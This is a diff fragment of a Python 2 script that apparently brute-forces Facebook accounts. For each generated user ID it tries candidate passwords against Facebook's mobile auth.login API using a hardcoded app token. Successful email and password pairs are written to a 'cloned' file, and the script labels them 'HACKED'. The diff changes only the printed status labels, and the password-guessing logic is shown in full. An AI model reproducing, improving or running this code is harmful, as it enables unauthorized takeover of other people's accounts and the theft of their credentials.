@@ -378,14 +378,14 @@ def action():
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass4 
+                                        print '\x1b[1;92m(HACKED)  ' + k + c + user + '  |  ' + pass4 
                                         okb = open('save/cloned.txt', 'a')
                                         okb.write(k+c+user+pass4+'\n')
                                         okb.close()
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass4
+                                            print '\033[1;97m(ERROR) ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
                                             cps.close()
@@ -395,7 +395,7 @@ def action():
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass5
+                                                print '\x1b[1;92m(HACKED)  ' + k + c + user + '  |  ' + pass5
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass5+'\n')
                                                 okb.close()
